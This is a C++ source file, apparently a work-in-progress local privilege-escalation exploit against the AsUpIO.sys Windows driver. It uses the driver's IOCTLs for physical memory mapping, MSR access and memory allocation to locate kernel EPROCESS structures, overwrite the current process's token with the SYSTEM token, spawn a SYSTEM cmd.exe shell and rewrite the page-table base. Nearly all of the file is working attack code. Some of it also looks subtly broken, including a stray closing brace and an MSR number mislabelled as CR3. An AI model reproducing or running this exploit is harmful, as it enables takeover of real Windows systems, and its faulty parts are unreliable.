// AsUpIO.sys Exploit - Work in progress, Privilege Escalation via multiple primitives.
// Author: blkph0x

#include <windows.h>
#include <iostream>
#include <cstdint>
#include <vector>
#include <intrin.h>
#include <iomanip>
#include <tlhelp32.h>
#include <string.h>

#define DEVICE_NAME "\\\\.\\IfYouKnowYouKnow"
#define IOCTL_MAP_MEM       0xA040244C
#define IOCTL_UNMAP_MEM     0xA0402450
#define IOCTL_RDMSR         0xA0406458
#define IOCTL_WRMSR         0xA040A45C
#define IOCTL_ALLOC_CONTIG  0xA040A488
#define PAGE_SIZE 0x1000
#define CR3_MSR 0xC0000102
#define PTE_FLAGS 0xE7ULL
#define SYSTEM_PID 4

size_t EPROCESS_PID_OFFSET = 0x0;
size_t EPROCESS_TOKEN_OFFSET = 0x0;
size_t EPROCESS_ACTIVE_LINKS = 0x0;

typedef struct _WRMSR_STRUCT {
    DWORD msr_id;
    DWORD eax;
    DWORD edx;
} WRMSR_STRUCT;

typedef struct _MAP_INPUT {
    int InterfaceType;
    ULONG BusNumber;
    ULONGLONG PhysAddr;
    ULONG Offset;
    ULONG AddressSpace;
} MAP_INPUT;

HANDLE OpenDevice() {
    return CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
}

bool ReadMSR(HANDLE hDevice, DWORD msr_id, ULONGLONG& value) {
    DWORD br = 0;
    ULONGLONG out = 0;
    return DeviceIoControl(hDevice, IOCTL_RDMSR, &msr_id, sizeof(msr_id), &out, sizeof(out), &br, nullptr) && (value = out, true);
}

bool WriteMSR(HANDLE hDevice, DWORD msr_id, ULONGLONG value) {
    WRMSR_STRUCT input = { msr_id, (DWORD)(value & 0xFFFFFFFF), (DWORD)(value >> 32) };
    BYTE dummy[8]; DWORD br;
    return DeviceIoControl(hDevice, IOCTL_WRMSR, &input, sizeof(input), dummy, sizeof(dummy), &br, nullptr);
}

bool AllocateContiguousMemory(HANDLE hDevice, size_t size, ULONGLONG& physAddr, ULONGLONG& virtAddr) {
    BYTE out[8] = {}; DWORD br;
    DWORD in = (DWORD)size;
    if (!DeviceIoControl(hDevice, IOCTL_ALLOC_CONTIG, &in, sizeof(in), out, sizeof(out), &br, nullptr)) return false;
    physAddr = *(ULONGLONG*)out;
    virtAddr = *(ULONGLONG*)out;
    return physAddr != 0;
}

bool ReadPhysicalMemory(HANDLE hDevice, ULONGLONG physAddr, void* buffer, size_t size) {
    MAP_INPUT in = { 1, 0, physAddr & ~(PAGE_SIZE - 1), (ULONG)(physAddr & (PAGE_SIZE - 1)), 0 };
    DWORD va = 0, br;
    if (!DeviceIoControl(hDevice, IOCTL_MAP_MEM, &in, sizeof(in), &va, sizeof(va), &br, nullptr)) return false;
    uintptr_t base = (uintptr_t)va + in.Offset;
    memcpy(buffer, (void*)base, size);
    DeviceIoControl(hDevice, IOCTL_UNMAP_MEM, &va, sizeof(va), nullptr, 0, &br, nullptr);
    return true;
}

bool WritePhysicalMemory(HANDLE hDevice, ULONGLONG physAddr, const void* data, size_t size) {
    MAP_INPUT in = { 1, 0, physAddr & ~(PAGE_SIZE - 1), (ULONG)(physAddr & (PAGE_SIZE - 1)), 0 };
    DWORD va = 0, br;
    if (!DeviceIoControl(hDevice, IOCTL_MAP_MEM, &in, sizeof(in), &va, sizeof(va), &br, nullptr)) return false;
    uintptr_t base = (uintptr_t)va + in.Offset;
    memcpy((void*)base, data, size);
    DeviceIoControl(hDevice, IOCTL_UNMAP_MEM, &va, sizeof(va), nullptr, 0, &br, nullptr);
    return true;
}

bool ScanEProcessOffsets(BYTE* page) {
    for (int i = 0; i < PAGE_SIZE - 0x100; i += 0x8) {
        DWORD possiblePid = *(DWORD*)(page + i);
        if (possiblePid == SYSTEM_PID) {
            for (int j = i + 0x10; j < i + 0x80; j += 0x8) {
                ULONGLONG fwd = *(ULONGLONG*)(page + j);
                ULONGLONG bwd = *(ULONGLONG*)(page + j + 0x8);
                if ((fwd & 0xF000000000000000) && (bwd & 0xF000000000000000)) {
                    EPROCESS_PID_OFFSET = i;
                    EPROCESS_ACTIVE_LINKS = j;
                    for (int k = j + 0x10; k < j + 0x100; k += 0x8) {
                        ULONGLONG possibleToken = *(ULONGLONG*)(page + k);
                        if ((possibleToken & 0xF000000000000000) && ((possibleToken & 0xF) == 0)) {
                            EPROCESS_TOKEN_OFFSET = k;
                            return true;
                        }
                    }
                }
            }
        }
    }
    return false;
}

void BuildFullPageTable(HANDLE hDevice, ULONGLONG pml4, ULONGLONG pdpt, ULONGLONG pd, ULONGLONG pt, ULONGLONG target) {
    ULONGLONG pml4e[512] = {}, pdpte[512] = {}, pde[512] = {}, pte[512] = {};
    pte[0] = target | PTE_FLAGS;
    pde[0] = pt | PTE_FLAGS;
    pdpte[0] = pd | PTE_FLAGS;
    pml4e[0] = pdpt | PTE_FLAGS;
    WritePhysicalMemory(hDevice, pt, pte, sizeof(pte));
    WritePhysicalMemory(hDevice, pd, pde, sizeof(pde));
    WritePhysicalMemory(hDevice, pdpt, pdpte, sizeof(pdpte));
    WritePhysicalMemory(hDevice, pml4, pml4e, sizeof(pml4e));
}

void StealSystemToken(HANDLE hDevice, ULONGLONG scanStart = 0, ULONGLONG scanEnd = 0) {
    bool tokenStolen = false;
    std::cout << "[*] Starting SYSTEM token steal..." << std::endl;
    ULONGLONG start = scanStart;
    ULONGLONG end = scanEnd;
    BYTE page[PAGE_SIZE];

    bool found = false;

    for (int pass = 0; pass < 2 && !found; ++pass) {
        if (pass == 1) {
            // fallback on second pass
            EPROCESS_PID_OFFSET = 0x1d0;
            EPROCESS_ACTIVE_LINKS = 0x1d8;
            EPROCESS_TOKEN_OFFSET = 0x248;
            std::cout << "[*] Fallback to known offsets: PID=0x1d0, Links=0x1d8, Token=0x248" << std::endl;
        }

        for (ULONGLONG addr = start; addr < end; addr += PAGE_SIZE) {
            if (!ReadPhysicalMemory(hDevice, addr, page, sizeof(page))) continue;

            if (pass == 0 && !ScanEProcessOffsets(page)) continue;

            DWORD pid = *(DWORD*)(page + EPROCESS_PID_OFFSET);
            if (pid != SYSTEM_PID) continue;

            ULONGLONG systemToken = *(ULONGLONG*)(page + EPROCESS_TOKEN_OFFSET) & ~0xF;
            ULONGLONG current = *(ULONGLONG*)(page + EPROCESS_ACTIVE_LINKS) - EPROCESS_ACTIVE_LINKS;

            while (true) {
                BYTE proc[PAGE_SIZE];
                if (!ReadPhysicalMemory(hDevice, current, proc, sizeof(proc))) break;
                DWORD thisPid = *(DWORD*)(proc + EPROCESS_PID_OFFSET);
                if (thisPid == GetCurrentProcessId()) {
                    std::cout << "[+] Found our EPROCESS @ 0x" << std::hex << current << ", patching token..." << std::endl;
                    *(ULONGLONG*)(proc + EPROCESS_TOKEN_OFFSET) = systemToken;
                    WritePhysicalMemory(hDevice, current, proc, sizeof(proc));
                    found = true;
                    tokenStolen = true;
                    break;
                }
                ULONGLONG flink = *(ULONGLONG*)(proc + EPROCESS_ACTIVE_LINKS);
                if (flink == 0 || flink == current + EPROCESS_ACTIVE_LINKS) break;
                current = flink - EPROCESS_ACTIVE_LINKS;
            }
        }
    }

    if (!found) {
        std::cerr << "[-] Failed to find SYSTEM or self EPROCESS." << std::endl;
    } else if (tokenStolen) {
        std::cout << "[+] Token stolen! Launching SYSTEM shell..." << std::endl;
        WinExec("cmd.exe", SW_SHOW);
    }
    }
}

void StealthSetupPlaceholder() {
    // TODO: Implement anti-debug, anti-VM, PEB patching, etc.
    std::cout << "[*] Stealth mode placeholder initialized." << std::endl;
}

void ShellSpawnPlaceholder() {
    // TODO: Replace with WinExec or CreateProcess with elevated token.
    std::cout << "[*] SYSTEM shell spawn placeholder invoked." << std::endl;
}

int main() {
    std::cout << "Select EPROCESS resolution method:" << std::endl;
    std::cout << "1) Scan virtual kernel address space (0xFFFFF800...)" << std::endl;
    std::cout << "2) Scan physical RAM range (0x0 to 0x100000000)" << std::endl;
    std::cout << "3) Use known offsets directly without scanning" << std::endl;
    std::cout << "4) Walk EPROCESS list from CR3 (manual page table walk)" << std::endl;
    std::cout << "5) (TODO) Enable stealth mode (anti-debug/anti-VM)" << std::endl;
    std::cout << "6) (TODO) Spawn SYSTEM shell after token steal" << std::endl;
    std::cout << "> Enter choice: ";
    int choice = 0;
    std::cin >> choice;

    ULONGLONG start = 0;
    ULONGLONG end = 0;

    if (choice == 1) {
        start = 0xFFFFF80000000000;
        end = start + (PAGE_SIZE * 0x8000); // scan 128MB kernel VA region
    } else if (choice == 2) {
        start = 0x00000000;
        end = 0x100000000; // first 4GB physical RAM
    } else if (choice == 3) {
        EPROCESS_PID_OFFSET = 0x1d0;
        EPROCESS_ACTIVE_LINKS = 0x1d8;
        EPROCESS_TOKEN_OFFSET = 0x248;
        std::cout << "[*] Using known offsets only. Skipping scan." << std::endl;
    } else if (choice == 4) {
        HANDLE hDevice = OpenDevice();
        if (!hDevice) return 1;

        ULONGLONG cr3;
        if (!ReadMSR(hDevice, CR3_MSR, cr3)) {
            std::cerr << "[-] Failed to read CR3" << std::endl;
            return 1;
        }
        std::cout << "[*] Walking from CR3: 0x" << std::hex << cr3 << std::endl;

        BYTE pml4[PAGE_SIZE];
        if (!ReadPhysicalMemory(hDevice, cr3, pml4, PAGE_SIZE)) {
            std::cerr << "[-] Failed to read PML4 from CR3" << std::endl;
            return 1;
        }

        for (int i = 0; i < 512; ++i) {
            ULONGLONG pml4e = ((ULONGLONG*)pml4)[i];
            if (!(pml4e & 1)) continue; // present
            ULONGLONG pdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;

            BYTE pdpt[PAGE_SIZE];
            if (!ReadPhysicalMemory(hDevice, pdpt_pa, pdpt, PAGE_SIZE)) continue;

            for (int j = 0; j < 512; ++j) {
                ULONGLONG pdpte = ((ULONGLONG*)pdpt)[j];
                if (!(pdpte & 1)) continue;
                ULONGLONG pd_pa = pdpte & 0xFFFFFFFFFF000ULL;

                BYTE pd[PAGE_SIZE];
                if (!ReadPhysicalMemory(hDevice, pd_pa, pd, PAGE_SIZE)) continue;

                for (int k = 0; k < 512; ++k) {
                    ULONGLONG pde = ((ULONGLONG*)pd)[k];
                    if (!(pde & 1)) continue;
                    ULONGLONG pt_pa = pde & 0xFFFFFFFFFF000ULL;

                    BYTE pt[PAGE_SIZE];
                    if (!ReadPhysicalMemory(hDevice, pt_pa, pt, PAGE_SIZE)) continue;

                    for (int m = 0; m < 512; ++m) {
                        ULONGLONG pte = ((ULONGLONG*)pt)[m];
                        if (!(pte & 1)) continue;
                        ULONGLONG page_pa = pte & 0xFFFFFFFFFF000ULL;

                        BYTE page[PAGE_SIZE];
                        if (!ReadPhysicalMemory(hDevice, page_pa, page, PAGE_SIZE)) continue;

                        for (int off = 0; off < PAGE_SIZE - 0x100; off += 0x10) {
                            DWORD pid = *(DWORD*)(page + off);
                            if (pid == SYSTEM_PID) {
                                EPROCESS_PID_OFFSET = off;
                                EPROCESS_ACTIVE_LINKS = off + 0x8;
                                EPROCESS_TOKEN_OFFSET = off + 0x78; // assumption
                                std::cout << "[+] Found PID 4 in page walk. Offsets: PID=0x" << std::hex << off
                                          << ", Links=0x" << (off + 8)
                                          << ", Token=0x" << (off + 0x78) << std::endl;
                                CloseHandle(hDevice);
                                return 0;
                            }
                        }
                    }
                }
            }
        }
        std::cerr << "[-] Failed to resolve EPROCESS via page table walk." << std::endl;
        CloseHandle(hDevice);
        return 1;
    } else if (choice == 5) {
        StealthSetupPlaceholder();
    } else if (choice == 6) {
        ShellSpawnPlaceholder();
    } else {
        std::cerr << "[!] Invalid choice." << std::endl;
        return 1;
    }
    HANDLE hDevice = OpenDevice();
    if (!hDevice) return 1;

    ULONGLONG cr3;
    if (!ReadMSR(hDevice, CR3_MSR, cr3)) {
        std::cerr << "[-] Failed to read CR3" << std::endl;
        return 1;
    }
    std::cout << "[*] Original CR3: 0x" << std::hex << cr3 << std::endl;

    ULONGLONG pml4Phys, pml4Virt, pdptPhys, pdptVirt, pdPhys, pdVirt, ptPhys, ptVirt, testPhys, testVirt;
    if (!AllocateContiguousMemory(hDevice, PAGE_SIZE, pml4Phys, pml4Virt) ||
        !AllocateContiguousMemory(hDevice, PAGE_SIZE, pdptPhys, pdptVirt) ||
        !AllocateContiguousMemory(hDevice, PAGE_SIZE, pdPhys, pdVirt) ||
        !AllocateContiguousMemory(hDevice, PAGE_SIZE, ptPhys, ptVirt)   ||
        !AllocateContiguousMemory(hDevice, PAGE_SIZE, testPhys, testVirt)) {
        std::cerr << "[-] Allocation failed" << std::endl;
        return 1;
    }

    const char* data = "blkph0x_was_here";
    BYTE clean[PAGE_SIZE] = {};
    WritePhysicalMemory(hDevice, testPhys, clean, sizeof(clean));
    WritePhysicalMemory(hDevice, testPhys, data, strlen(data) + 1);

    std::cout << "[DEBUG] Physical dump before CR3 switch:" << std::endl;
    BYTE physDump[32] = {};
    if (ReadPhysicalMemory(hDevice, testPhys, physDump, sizeof(physDump))) {
        for (int i = 0; i < 32; ++i)
            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)physDump[i] << " ";
        std::cout << "\n[DEBUG] As string: " << (char*)physDump << std::endl;
    }

    StealSystemToken(hDevice, start, end);

    std::cout << "[*] Overwriting CR3..." << std::endl;
    if (WriteMSR(hDevice, CR3_MSR, pml4Phys)) {
        std::cout << "[+] CR3 set. You are now executing under a custom page table!" << std::endl;
    } else {
        std::cerr << "[-] Failed to write CR3" << std::endl;
    }

    CloseHandle(hDevice);
    return 0;
}
